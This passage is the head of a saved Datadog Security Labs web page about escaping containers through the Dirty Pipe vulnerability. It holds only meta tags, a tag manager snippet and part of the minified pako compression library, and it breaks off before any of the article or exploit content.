<!DOCTYPE html>
<!-- saved from url=(0105)https://securitylabs.datadoghq.com/articles/dirty-pipe-container-escape-poc/#breaking-out-from-containers -->
<html lang="en" itemtype="http://schema.org/Article" class=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Escaping containers using the Dirty Pipe vulnerability | Datadog Security Labs</title>
    
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="See Datadog&#39;s proof of concept exploit for breaking out from unprivileged containers using the Dirty Pipe vulnerability.">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Escaping containers using the Dirty Pipe vulnerability">
    <meta name="twitter:site" content="@datadoghq">
    <meta name="twitter:creator" content="@datadoghq">
    <meta name="twitter:description" content="See Datadog&#39;s proof of concept exploit for breaking out from unprivileged containers using the Dirty Pipe vulnerability.">
    <meta name="twitter:image" content="https://datadog-securitylabs.imgix.net/img/emergingvuln_hero_explode.png?w=1200&amp;h=630&amp;auto=format">
    <meta property="og:title" content="Escaping containers using the Dirty Pipe vulnerability |  Datadog Security Labs">
    <meta property="og:type" content="article">
    <meta property="og:description" content="See Datadog&#39;s proof of concept exploit for breaking out from unprivileged containers using the Dirty Pipe vulnerability.">
    <meta name="image" property="og:image" content="https://datadog-securitylabs.imgix.net/img/emergingvuln_hero_explode.png?w=1200&amp;h=630&amp;auto=format">
    
    <link rel="shortcut icon" href="https://datadog-securitylabs.imgix.net/img/favicon.ico" type="image/x-icon">
    <link rel="preload" href="./Escaping containers using the Dirty Pipe vulnerability _ Datadog Security Labs_files/styles-37ZE273F.css" as="style">
    <link rel="stylesheet" href="./Escaping containers using the Dirty Pipe vulnerability _ Datadog Security Labs_files/styles-37ZE273F.css">
    <script type="text/javascript" async="" src="./Escaping containers using the Dirty Pipe vulnerability _ Datadog Security Labs_files/js"></script><script type="text/javascript" async="" src="./Escaping containers using the Dirty Pipe vulnerability _ Datadog Security Labs_files/js(1)"></script><script async="" src="./Escaping containers using the Dirty Pipe vulnerability _ Datadog Security Labs_files/gtm.js"></script><script src="./Escaping containers using the Dirty Pipe vulnerability _ Datadog Security Labs_files/main-NKMZU6RK.js"></script>
    <!-- Google Tag Manager -->
    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-WDC8G6');</script>
    <!-- End Google Tag Manager -->
  <meta http-equiv="origin-trial" content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9"><link type="text/css" rel="stylesheet" charset="UTF-8" href="./Escaping containers using the Dirty Pipe vulnerability _ Datadog Security Labs_files/m=el_main_css"><script>/**
 * @license
 * pako 1.0.6 nodeca/pako
 * Copyright (C) 2014-2017 by Vitaly Puzrin and Andrei Tuputcyn
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 * Ported from zlib 1.2.8
 * Copyright (C) 1995-2013 Jean-loup Gailly and Mark Adler
 *
 * This software is provided 'as-is', without any express or implied
 * warranty.  In no event will the authors be held liable for any damages
 * arising from the use of this software.
 *
 * Permission is granted to anyone to use this software for any purpose,
 * including commercial applications, and to alter it and redistribute it
 * freely, subject to the following restrictions:
 *
 * 1. The origin of this software must not be misrepresented; you must not
 *    claim that you wrote the original software. If you use this software
 *    in a product, an acknowledgment in the product documentation would be
 *    appreciated but is not required.
 * 2. Altered source versions must be plainly marked as such, and must not be
 *    misrepresented as being the original software.
 * 3. This notice may not be removed or altered from any source distribution.
 *
 * Jean-loup Gailly        Mark Adler
 * jloup@gzip.org          madler@alumni.caltech.edu
 */
!function(t){if("object"==typeof exports&&"undefined"!=typeof module)module.exports=t();else if("function"==typeof define&&define.amd)define([],t);else{("undefined"!=typeof window?window:"undefined"!=typeof global?global:"undefined"!=typeof self?self:this).pako=t()}}(function(){return function t(e,a,i){function n(s,o){if(!a[s]){if(!e[s]){var l="function"==typeof require&&require;if(!o&&l)return l(s,!0);if(r)return r(s,!0);var h=new Error("Cannot find module '"+s+"'");throw h.code="MODULE_NOT_FOUND",h}var d=a[s]={exports:{}};e[s][0].call(d.exports,function(t){var a=e[s][1][t];return n(a||t)},d,d.exports,t,e,a,i)}return a[s].exports}for(var r="function"==typeof require&&require,s=0;s<i.length;s++)n(i[s]);return n}({1:[function(t,e,a){"use strict";function i(t){if(!(this instanceof i))return new i(t);this.options=s.assign({level:_,method:c,chunkSize:16384,windowBits:15,memLevel:8,strategy:u,to:""},t||{});var e=this.options;e.raw&&e.windowBits>0?e.windowBits=-e.windowBits:e.gzip&&e.windowBits>0&&e.windowBits<16&&(e.windowBits+=16),this.err=0,this.msg="",this.ended=!1,this.chunks=[],this.strm=new h,this.strm.avail_out=0;var a=r.deflateInit2(this.strm,e.level,e.method,e.windowBits,e.memLevel,e.strategy);if(a!==f)throw new Error(l[a]);if(e.header&&r.deflateSetHeader(this.strm,e.header),e.dictionary){var n;if(n="string"==typeof e.dictionary?o.string2buf(e.dictionary):"[object ArrayBuffer]"===d.call(e.dictionary)?new Uint8Array(e.dictionary):e.dictionary,(a=r.deflateSetDictionary(this.strm,n))!==f)throw new Error(l[a]);this._dict_set=!0}}function n(t,e){var a=new i(e);if(a.push(t,!0),a.err)throw a.msg||l[a.err];return a.result}var r=t("./zlib/deflate"),s=t("./utils/common"),o=t("./utils/strings"),l=t("./zlib/messages"),h=t("./zlib/zstream"),d=Object.prototype.toString,f=0,_=-1,u=0,c=8;i.prototype.push=function(t,e){var a,i,n=this.strm,l=this.options.chunkSize;if(this.ended)return!1;i=e===~~e?e:!0===e?4:0,"string"==typeof t?n.input=o.string2buf(t):"[object ArrayBuffer]"===d.call(t)?n.input=new Uint8Array(t):n.input=t,n.next_in=0,n.avail_in=n.input.length;do{if(0===n.avail_out&&(n.output=new s.Buf8(l),n.next_out=0,n.avail_out=l),1!==(a=r.deflate(n,i))&&a!==f)return this.onEnd(a),this.ended=!0,!1;0!==n.avail_out&&(0!==n.avail_in||4!==i&&2!==i)||("string"===this.options.to?this.onData(o.buf2binstring(s.shrinkBuf(n.output,n.next_out))):this.onData(s.shrinkBuf(n.output,n.next_out)))}while((n.avail_in>0||0===n.avail_out)&&1!==a);return 4===i?(a=r.deflateEnd(this.strm),this.onEnd(a),this.ended=!0,a===f):2!==i||(this.onEnd(f),n.avail_out=0,!0)},i.prototype.onData=function(t){this.chunks.push(t)},i.prototype.onEnd=function(t){t===f&&("string"===this.options.to?this.result=this.chunks.join(""):this.result=s.flattenChunks(this.chunks)),this.chunks=[],this.err=t,this.msg=this.strm.msg},a.Deflate=i,a.deflate=n,a.deflateRaw=function(t,e){return e=e||{},e.raw=!0,n(t,e)},a.gzip=function(t,e){return e=e||{},e.gzip=!0,n(t,e)}},{"./utils/common":3,"./utils/strings":4,"./zlib/deflate":8,"./zlib/messages":13,"./zlib/zstream":15}],2:[function(t,e,a){"use strict";function i(t){if(!(this instanceof i))return new i(t);this.options=s.assign({chunkSize:16384,windowBits:0,to:""},t||{});var e=this.options;e.raw&&e.windowBits>=0&&e.windowBits<16&&(e.windowBits=-e.windowBits,0===e.windowBits&&(e.windowBits=-15)),!(e.windowBits>=0&&e.windowBits<16)||t&&t.windowBits||(e.windowBits+=32),e.windowBits>15&&e.windowBits<48&&0==(15&e.windowBits)&&(e.windowBits|=15),this.err=0,this.msg="",this.ended=!1,this.chunks=[],this.strm=new d,this.strm.avail_out=0;var a=r.inflateInit2(this.strm,e.windowBits);if(a!==l.Z_OK)throw new Error(h[a]);this.header=new f,r.inflateGetHeader(this.strm,this.header)}function n(t,e){var a=new i(e);if(a.push(t,!0),a.err)throw a.msg||h[a.err];return a.result}var r=t("./zlib/inflate"),s=t("./utils/common"),o=t("./utils/strings"),l=t("./zlib/constants"),h=t("./zlib/messages"),d=t("./zlib/zstream"),f=t("./zlib/gzheader"),_=Object.prototype.toString;i.prototype.push=function(t,e){var a,i,n,h,d,f,u=this.strm,c=this.options.chunkSize,b=this.options.dictionary,g=!1;if(this.ended)return!1;i=e===~~e?e:!0===e?l.Z_FINISH:l.Z_NO_FLUSH,"string"==typeof t?u.input=o.binstring2buf(t):"[object ArrayBuffer]"===_.call(t)?u.input=new Uint8Array(t):u.input=t,u.next_in=0,u.avail_in=u.input.length;do{if(0===u.avail_out&&(u.output=new s.Buf8(c),u.next_out=0,u.avail_out=c),(a=r.inflate(u,l.Z_NO_FLUSH))===l.Z_NEED_DICT&&b&&(f="string"==typeof b?o.string2buf(b):"[object ArrayBuffer]"===_.call(b)?new Uint8Array(b):b,a=r.inflateSetDictionary(this.strm,f)),a===l.Z_BUF_ERROR&&!0===g&&(a=l.Z_OK,g=!1),a!==l.Z_STREAM_END&&a!==l.Z_OK)return this.onEnd(a),this.ended=!0,!1;u.next_out&&(0!==u.avail_out&&a!==l.Z_STREAM_END&&(0!==u.avail_in||i!==l.Z_FINISH&&i!==l.Z_SYNC_FLUSH)||("string"===this.options.to?(n=o.utf8border(u.output,u.next_out),h=u.next_out-n,d=o.buf2string(u.output,n),u.next_out=h,u.avail_out=c-h,h&&s.arraySet(u.output,u.output,n,h,0),this.onData(d)):this.onData(s.shrinkBuf(u.output,u.next_out)))),0===u.avail_in&&0===u.avail_out&&(g=!0)}while((u.avail_in>0||0===u.avail_out)&&a!==l.Z_STREAM_END);return a===l.Z_STREAM_END&&(i=l.Z_FINISH),i===l.Z_FINISH?(a=r.inflateEnd(this.strm),this.onEnd(a),this.ended=!0,a===l.Z_OK):i!==l.Z_SYNC_FLUSH||(this.onEnd(l.Z_OK),u.avail_out=0,!0)},i.prototype.onData=function(t){this.chunks.push(t)},i.prototype.onEnd=function(t){t===l.Z_OK&&("string"===this.options.to?this.result=this.chunks.join(""):this.result=s.flattenChunks(this.chunks)),this.chunks=[],this.err=t,this.msg=this.strm.msg},a.Inflate=i,a.inflate=n,a.inflateRaw=function(t,e){return e=e||{},e.raw=!0,n(t,e)},a.ungzip=n},{"./utils/common":3,"./utils/strings":4,"./zlib/constants":6,"./zlib/gzheader":9,"./zlib/inflate":11,"./zlib/messages":13,"./zlib/zstream":15}],3:[function(t,e,a){"use strict";function i(t,e){return Object.prototype.hasOwnProperty.call(t,e)}var n="undefined"!=typeof Uint8Array&&"undefined"!=typeof Uint16Array&&"undefined"!=typeof Int32Array;a.assign=function(t){for(var e=Array.prototype.slice.call(arguments,1);e.length;){var a=e.shift();if(a){if("object"!=typeof a)throw new TypeError(a+"must be non-object");for(var n in a)i(a,n)&&(t[n]=a[n])}}return t},a.shrinkBuf=function(t,e){return t.length===e?t:t.subarray?t.subarray(0,e):(t.length=e,t)};var r={arraySet:function(t,e,a,i,n){if(e.subarray&&t.subarray)t.set(e.subarray(a,a+i),n);else for(var r=0;r<i;r++)t[n+r]=e[a+r]},flattenChunks:function(t){var e,a,i,n,r,s;for(i=0,e=0,a=t.length;e<a;e++)i+=t[e].length;for(s=new Uint8Array(i),n=0,e=0,a=t.length;e<a;e++)r=t[e],s.set(r,n),n+=r.length;return s}},s={arraySet:function(t,e,a,i,n){for(var r=0;r<i;r++)t[n+r]=e[a+r]},flattenChunks:function(t){return[].concat.apply([],t)}};a.setTyped=function(t){t?(a.Buf8=Uint8Array,a.Buf16=Uint16Array,a.Buf32=Int32Array,a.assign(a,r)):(a.Buf8=Array,a.Buf16=Array,a.Buf32=Array,a.assign(a,s))},a.setTyped(n)},{}],4:[function(t,e,a){"use strict";function i(t,e){if(e<65537&&(t.subarray&&s||!t.subarray&&r))return String.fromCharCode.apply(null,n.shrinkBuf(t,e));for(var a="",i=0;i<e;i++)a+=String.fromCharCode(t[i]);return a}var n=t("./common"),r=!0,s=!0;try{String.fromCharCode.apply(null,[0])}catch(t){r=!1}try{String.fromCharCode.apply(null,new Uint8Array(1))}catch(t){s=!1}for(var o=new n.Buf8(256),l=0;l<256;l++)o[l]=l>=252?6:l>=248?5:l>=240?4:l>=224?3:l>=192?2:1;o[254]=o[254]=1,a.string2buf=function(t){var e,a,i,r,s,o=t.length,l=0;for(r=0;r<o;r++)55296==(64512&(a=t.charCodeAt(r)))&&r+1<o&&56320==(64512&(i=t.charCodeAt(r+1)))&&(a=65536+(a-55296<<10)+(i-56320),r++),l+=a<128?1:a<2048?2:a<65536?3:4;for(e=new n.Buf8(l),s=0,r=0;s<l;r++)55296==(64512&(a=t.charCodeAt(r)))&&r+1<o&&56320==(64512&(i=t.charCodeAt(r+1)))&&(a=65536+(a-55296<<10)+(i-56320),r++),a<128?e[s++]=a:a<2048?(e[s++]=192|a>>>6,e[s++]=128|63&a):a<65536?(e[s++]=224|a>>>12,e[s++]=128|a>>>6&63,e[s++]=128|63&a):(e[s++]=240|a>>>18,e[s++]=128|a>>>12&63,e[s++]=128|a>>>6&63,e[s++]=128|63&a);return e},a.buf2binstring=function(t){return i(t,t.length)},a.binstring2buf=function(t){for(var e=new n.Buf8(t.length),a=0,i=e.length;a<i;a++)e[a]=t.charCodeAt(a);return e},a.buf2string=function(t,e){var a,n,r,s,l=e||t.length,h=new Array(2*l);for(n=0,a=0;a<l;)if((r=t[a++])<128)h[n++]=r;else if((s=o[r])>4)h[n++]=65533,a+=s-1;else{for(r&=2===s?31:3===s?15:7;s>1&&a<l;)r=r<<6|63&t[a++],s--;s>1?h[n++]=65533:r<65536?h[n++]=r:(r-=65536,h[n++]=55296|r>>10&1023,h[n++]=56320|1023&r)}return i(h,n)},a.utf8border=function(t,e){var a;for((e=e||t.length)>t.length&&(e=t.length),a=e-1;a>=0&&128==(192&t[a]);)a--;return a<0?e:0===a?e:a+o[t[a]]>e?a:e}},{"./common":3}],5:[function(t,e,a){"use strict";e.exports=function(t,e,a,i){for(var n=65535&t|0,r=t>>>16&65535|0,s=0;0!==a;){a-=s=a>2e3?2e3:a;do{r=r+(n=n+e[i++]|0)|0}while(--s);n%=65521,r%=65521}return n|r<<16|0}},{}],6:[function(t,e,a){"use strict";e.exports={Z_NO_FLUSH:0,Z_PARTIAL_FLUSH:1,Z_SYNC_FLUSH:2,Z_FULL_FLUSH:3,Z_FINISH:4,Z_BLOCK:5,Z_TREES:6,Z_OK:0,Z_STREAM_END:1,Z_NEED_DICT:2,Z_ERRNO:-1,Z_STREAM_ERROR:-2,Z_DATA_ERROR:-3,Z_BUF_ERROR:-5,Z_NO_COMPRESSION:0,Z_BEST_SPEED:1,Z_BEST_COMPRESSION:9,Z_DEFAULT_COMPRESSION:-1,Z_FILTERED:1,Z_HUFFMAN_ONLY:2,Z_RLE:3,Z_FIXED:4,Z_DEFAULT_STRATEGY:0,Z_BINARY:0,Z_TEXT:1,Z_UNKNOWN:2,Z_DEFLATED:8}},{}],7:[function(t,e,a){"use strict";var i=function(){for(var t,e=[],a=0;a<256;a++){t=a;for(var i=0;i<8;i++)t=1&t?3988292384^t>>>1:t>>>1;e[a]=t}return e}();e.exports=function(t,e,a,n){var r=i,s=n+a;t^=-1;for(var o=n;o<s;o++)t=t>>>8^r[255&(t^e[o])];return-1^t}},{}],8:[function(t,e,a){"use strict";function i(t,e){return t.msg=A[e],e}function n(t){return(t<<1)-(t>4?9:0)}function r(t){for(var e=t.length;--e>=0;)t[e]=0}function s(t){var e=t.state,a=e.pending;a>t.avail_out&&(a=t.avail_out),0!==a&&(z.arraySet(t.output,e.pending_buf,e.pending_out,a,t.next_out),t.next_out+=a,e.pending_out+=a,t.total_out+=a,t.avail_out-=a,e.pending-=a,0===e.pending&&(e.pending_out=0))}function o(t,e){B._tr_flush_block(t,t.block_start>=0?t.block_start:-1,t.strstart-t.block_start,e),t.block_start=t.strstart,s(t.strm)}function l(t,e){t.pending_buf[t.pending++]=e}function h(t,e){t.pending_buf[t.pending++]=e>>>8&255,t.pending_buf[t.pending++]=255&e}function d(t,e,a,i){var n=t.avail_in;return n>i&&(n=i),0===n?0:(t.avail_in-=n,z.arraySet(e,t.input,t.next_in,n,a),1===t.state.wrap?t.adler=S(t.adler,e,n,a):2===t.state.wrap&&(t.adler=E(t.adler,e,n,a)),t.next_in+=n,t.total_in+=n,n)}function f(t,e){var a,i,n=t.max_chain_length,r=t.strstart,s=t.prev_length,o=t.nice_match,l=t.strstart>t.w_size-it?t.strstart-(t.w_size-it):0,h=t.window,d=t.w_mask,f=t.prev,_=t.strstart+at,u=h[r+s-1],c=h[r+s];t.prev_length>=t.good_match&&(n>>=2),o>t.lookahead&&(o=t.lookahead);do{if(a=e,h[a+s]===c&&h[a+s-1]===u&&h[a]===h[r]&&h[++a]===h[r+1]){r+=2,a++;do{}while(h[++r]===h[++a]&&h[++r]===h[++a]&&h[++r]===h[++a]&&h[++r]===h[++a]&&h[++r]===h[++a]&&h[++r]===h[++a]&&h[++r]===h[++a]&&h[++r]===h[++a]&&r<_);if(i=at-(_-r),r=_-at,i>s){if(t.match_start=e,s=i,i>=o)break;u=h[r+s-1],c=h[r+s]}}}while((e=f[e&d])>l&&0!=--n);return s<=t.lookahead?s:t.lookahead}function _(t){var e,a,i,n,r,s=t.w_size;do{if(n=t.window_size-t.lookahead-t.strstart,t.strstart>=s+(s-it)){z.arraySet(t.window,t.window,s,s,0),t.match_start-=s,t.strstart-=s,t.block_start-=s,e=a=t.hash_size;do{i=t.head[--e],t.head[e]=i>=s?i-s:0}while(--a);e=a=s;do{i=t.prev[--e],t.prev[e]=i>=s?i-s:0}while(--a);n+=s}if(0===t.strm.avail_in)break;if(a=d(t.strm,t.window,t.strstart+t.lookahead,n),t.lookahead+=a,t.lookahead+t.insert>=et)for(r=t.strstart-t.insert,t.ins_h=t.window[r],t.ins_h=(t.ins_h<<t.hash_shift^t.window[r+1])&t.hash_mask;t.insert&&(t.ins_h=(t.ins_h<<t.hash_shift^t.window[r+et-1])&t.hash_mask,t.prev[r&t.w_mask]=t.head[t.ins_h],t.head[t.ins_h]=r,r++,t.insert--,!(t.lookahead+t.insert<et)););}while(t.lookahead<it&&0!==t.strm.avail_in)}function u(t,e){for(var a,i;;){if(t.lookahead<it){if(_(t),t.lookahead<it&&e===Z)return _t;if(0===t.lookahead)break}if(a=0,t.lookahead>=et&&(t.ins_h=(t.ins_h<<t.hash_shift^t.window[t.strstart+et-1])&t.hash_mask,a=t.prev[t.strstart&t.w_mask]=t.head[t.ins_h],t.head[t.ins_h]=t.strstart),0!==a&&t.strstart-a<=t.w_size-it&&(t.match_length=f(t,a)),t.match_length>=et)if(i=B._tr_tally(t,t.strstart-t.match_start,t.match_length-et),t.lookahead-=t.match_length,t.match_length<=t.max_lazy_match&&t.lookahead>=et){t.match_length--;do{t.strstart++,t.ins_h=(t.ins_h<<t.hash_shift^t.window[t.strstart+et-1])&t.hash_mask,a=t.prev[t.strstart&t.w_mask]=t.head[t.ins_h],t.head[t.ins_h]=t.strstart}while(0!=--t.match_length);t.strstart++}else t.strstart+=t.match_length,t.match_length=0,t.ins_h=t.window[t.strstart],t.ins_h=(t.ins_h<<t.hash_shift^t.window[t.strstart+1])&t.hash_mask;else i=B._tr_tally(t,0,t.window[t.strstart]),t.lookahead--,t.strstart++;if(i&&(o(t,!1),0===t.strm.avail_out))return _t}return t.insert=t.strstart<et-1?t.strstart:et-1,e===N?(o(t,!0),0===t.strm.avail_out?ct:bt):t.last_lit&&(o(t,!1),0===t.strm.avail_out)?_t:ut}function c(t,e){for(var a,i,n;;){if(t.lookahead<it){if(_(t),t.lookahead<it&&e===Z)return _t;if(0===t.lookahead)break}if(a=0,t.lookahead>=et&&(t.ins_h=(t.ins_h<<t.hash_shift^t.window[t.strstart+et-1])&t.hash_mask,a=t.prev[t.strstart&t.w_mask]=t.head[t.ins_h],t.head[t.ins_h]=t.strstart),t.prev_length=t.match_length,t.prev_match=t.match_start,t.match_length=et-1,0!==a&&t.prev_length<t.max_lazy_match&&t.strstart-a<=t.w_size-it&&(t.match_length=f(t,a),t.match_length<=5&&(t.strategy===H||t.match_length===et&&t.strstart-t.match_start>4096)&&(t.match_length=et-1)),t.prev_length>=et&&t.match_length<=t.prev_length){n=t.strstart+t.lookahead-et,i=B._tr_tally(t,t.strstart-1-t.prev_match,t.prev_length-et),t.lookahead-=t.prev_length-1,t.prev_length-=2;do{++t.strstart<=n&&(t.ins_h=(t.ins_h<<t.hash_shift^t.window[t.strstart+et-1])&t.hash_mask,a=t.prev[t.strstart&t.w_mask]=t.head[t.ins_h],t.head[t.ins_h]=t.strstart)}while(0!=--t.prev_length);if(t.match_available=0,t.match_length=et-1,t.strstart++,i&&(o(t,!1),0===t.strm.avail_out))return _t}else if(t.match_available){if((i=B._tr_tally(t,0,t.window[t.strstart-1]))&&o(t,!1),t.strstart++,t.lookahead--,0===t.strm.avail_out)return _t}else t.match_available=1,t.strstart++,t.lookahead--}return t.match_available&&(i=B._tr_tally(t,0,t.window[t.strstart-1]),t.match_available=0),t.insert=t.strstart<et-1?t.strstart:et-1,e===N?(o(t,!0),0===t.strm.avail_out?ct:bt):t.last_lit&&(o(t,!1),0===t.strm.avail_out)?_t:ut}function b(t,e){for(var a,i,n,r,s=t.window;;){if(t.lookahead<=at){if(_(t),t.lookahead<=at&&e===Z)return _t;if(0===t.lookahead)break}if(t.match_length=0,t.lookahead>=et&&t.strstart>0&&(n=t.strstart-1,(i=s[n])===s[++n]&&i===s[++n]&&i===s[++n])){r=t.strstart+at;do{}while(i===s[++n]&&i===s[++n]&&i===s[++n]&&i===s[++n]&&i===s[++n]&&i===s[++n]&&i===s[++n]&&i===s[++n]&&n<r);t.match_length=at-(r-n),t.match_length>t.lookahead&&(t.match_length=t.lookahead)}if(t.match_length>=et?(a=B._tr_tally(t,1,t.match_length-et),t.lookahead-=t.match_length,t.strstart+=t.match_length,t.match_length=0):(a=B._tr_tally(t,0,t.window[t.strstart]),t.lookahead--,t.strstart++),a&&(o(t,!1),0===t.strm.avail_out))return _t}return t.insert=0,e===N?(o(t,!0),0===t.strm.avail_out?ct:bt):t.last_lit&&(o(t,!1),0===t.strm.avail_out)?_t:ut}function g(t,e){for(var a;;){if(0===t.lookahead&&(_(t),0===t.lookahead)){if(e===Z)return _t;break}if(t.match_length=0,a=B._tr_tally(t,0,t.window[t.strstart]),t.lookahead--,t.strstart++,a&&(o(t,!1),0===t.strm.avail_out))return _t}return t.insert=0,e===N?(o(t,!0),0===t.strm.avail_out?ct:bt):t.last_lit&&(o(t,!1),0===t.strm.avail_out)?_t:ut}function m(t,e,a,i,n){this.good_length=t,this.max_lazy=e,this.nice_length=a,this.max_chain=i,this.func=n}function w(t){t.window_size=2*t.w_size,r(t.head),t.max_lazy_match=x[t.level].max_lazy,t.good_match=x[t.level].good_length,t.nice_match=x[t.level].nice_length,t.max_chain_length=x[t.level].max_chain,t.strstart=0,t.block_start=0,t.lookahead=0,t.insert=0,t.match_length=t.prev_length=et-1,t.match_available=0,t.ins_h=0}function p(){this.strm=null,this.status=0,this.pending_buf=null,this.pending_buf_size=0,this.pending_out=0,this.pending=0,this.wrap=0,this.gzhead=null,this.gzindex=0,this.method=q,this.last_flush=-1,this.w_size=0,this.w_bits=0,this.w_mask=0,this.window=null,this.window_size=0,this.prev=null,this.head=null,this.ins_h=0,this.hash_size=0,this.hash_bits=0,this.hash_mask=0,this.hash_shift=0,this.block_start=0,this.match_length=0,this.prev_match=0,this.match_available=0,this.strstart=0,this.match_start=0,this.lookahead=0,this.prev_length=0,this.max_chain_length=0,this.max_lazy_match=0,this.level=0,this.strategy=0,this.good_match=0,this.nice_match=0,this.dyn_ltree=new z.Buf16(2*$),this.dyn_dtree=new z.Buf16(2*(2*Q+1)),this.bl_tree=new z.Buf16(2*(2*V+1)),r(this.dyn_ltree),r(this.dyn_dtree),r(this.bl_tree),this.l_desc=null,this.d_desc=null,this.bl_desc=null,this.bl_count=new z.Buf16(tt+1),this.heap=new z.Buf16(2*J+1),r(this.heap),this.heap_len=0,this.heap_max=0,this.depth=new z.Buf16(2*J+1),r(this.depth),this.l_buf=0,this.lit_bufsize=0,this.last_lit=0,this.d_buf=0,this.opt_len=0,this.static_len=0,this.matches=0,this.insert=0,this.bi_buf=0,this.bi_valid=0}function v(t){var e;return t&&t.state?(t.total_in=t.total_out=0,t.data_type=Y,e=t.state,e.pending=0,e.pending_out=0,e.wrap<0&&(e.wrap=-e.wrap),e.status=e.wrap?rt:dt,t.adler=2===e.wrap?0:1,e.last_flush=Z,B._tr_init(e),D):i(t,U)}function k(t){var e=v(t);return e===D&&w(t.state),e}function y(t,e,a,n,r,s){if(!t)return U;var o=1;if(e===L&&(e=6),n<0?(o=0,n=-n):n>15&&(o=2,n-=16),r<1||r>G||a!==q||n<8||n>15||e<0||e>9||s<0||s>M)return i(t,U);8===n&&(n=9);var l=new p;return t.state=l,l.strm=t,l.wrap=o,l.gzhead=null,l.w_bits=n,l.w_size=1<<l.w_bits,l.w_mask=l.w_size-1,l.hash_bits=r+7,l.hash_size=1<<l.hash_bits,l.hash_mask=l.hash_size-1,l.hash_shift=~~((l.hash_bits+et-1)/et),l.window=new z.Buf8(2*l.w_size),l.head=new z.Buf16(l.hash_size),l.prev=new z.Buf16(l.w_size),l.lit_bufsize=1<<r+6,l.pending_buf_size=4*l.lit_bufsize,l.pending_buf=new z.Buf8(l.pending_buf_size),l.d_buf=1*l.lit_bufsize,l.l_buf=3*l.lit_bufsize,l.level=e,l.strategy=s,l.method=a,k(t)}var x,z=t("../utils/common"),B=t("./trees"),S=t("./adler32"),E=t("./crc32"),A=t("./messages"),Z=0,R=1,C=3,N=4,O=5,D=0,I=1,U=-2,T=-3,F=-5,L=-1,H=1,j=2,K=3,M=4,P=0,Y=2,q=8,G=9,X=15,W=8,J=286,Q=30,V=19,$=2*J+1,tt=15,et=3,at=258,it=at+et+1,nt=32,rt=42,st=69,ot=73,lt=91,ht=103,dt=113,ft=666,_t=1,ut=2,ct=3,bt=4,gt=3;x=[new m(0,0,0,0,function(t,e){var a=65535;for(a>t.pending_buf_size-5&&(a=t.pending_buf_size-5);;){if(t.lookahead<=1){if(_(t),0===t.lookahead&&e===Z)return _t;if(0===t.lookahead)break}t.strstart+=t.lookahead,t.lookahead=0;var i=t.block_start+a;if((0===t.strstart||t.strstart>=i)&&(t.lookahead=t.strstart-i,t.strstart=i,o(t,!1),0===t.strm.avail_out))return _t;if(t.strstart-t.block_start>=t.w_size-it&&(o(t,!1),0===t.strm.avail_out))return _t}return t.insert=0,e===N?(o(t,!0),0===t.strm.avail_out?ct:bt):(t.strstart>t.block_start&&(o(t,!1),t.strm.avail_out),_t)}),new m(4,4,8,4,u),new m(4,5,16,8,u),new m(4,6,32,32,u),new m(4,4,16,16,c),new m(8,16,32,32,c),new m(8,16,128,128,c),new m(8,32,128,256,c),new m(32,128,258,1024,c),new m(32,258,258,4096,c)],a.deflateInit=function(t,e){return y(t,e,q,X,W,P)},a.deflateInit2=y,a.deflateReset=k,a.deflateResetKeep=v,a.deflateSetHeader=function(t,e){return t&&t.state?2!==t.state.wrap?U:(t.state.gzhead=e,D):U},a.deflate=function(t,e){var a,o,d,f;if(!t||!t.state||e>O||e<0)return t?i(t,U):U;if(o=t.state,!t.output||!t.input&&0!==t.avail_in||o.status===ft&&e!==N)return 